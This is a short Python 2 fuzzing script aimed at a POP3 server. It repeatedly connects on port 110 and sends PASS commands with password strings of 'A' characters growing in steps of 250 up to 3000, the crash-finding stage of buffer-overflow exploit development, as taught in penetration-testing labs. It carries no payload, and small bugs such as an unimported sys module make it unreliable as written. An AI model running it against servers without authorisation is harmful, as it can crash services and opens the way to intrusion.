#!/usr/bin/python
import os
import socket

try:
   rhost=os.environ['RHOST']
except KeyError:
   print("Please set RHOST environment variable")
   sys.exit(0)

# Ethernet socket, open as a stream
buffSize=1024
counter=0
counterMax = 3000
pwd="A"
step=250

while counter <= counterMax:  
    try:
        pwd = 'A'*counter
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        # Establish connection with POP3 (TCP:110)
        print 'Connecting to '+rhost+'...'
        conn=s.connect((rhost,110))
        data = s.recv(buffSize)
        print data
        print 'Connected. Sending user name...'
        print 'Sending password size '+ str(counter) + '...'        
        userName='test'
        s.send('USER '+ userName +'\r\n')
        data = s.recv(buffSize)
        print data
        print 'Password: '+ pwd
        s.send('PASS '+ pwd +'\r\n')
        s.send('QUIT\r\n')
    except Exception as ex:
        print str(ex)
        pass
    finally:
        s.close()
        counter+=step

